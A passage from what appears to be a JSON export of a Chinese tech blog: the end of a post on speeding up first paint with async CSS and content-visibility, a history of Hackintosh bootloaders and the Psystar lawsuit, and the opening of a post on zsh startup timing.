trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\"> <div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-03</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\"> <div class=\"license-title\">黑苹果的历史</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-09-02</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 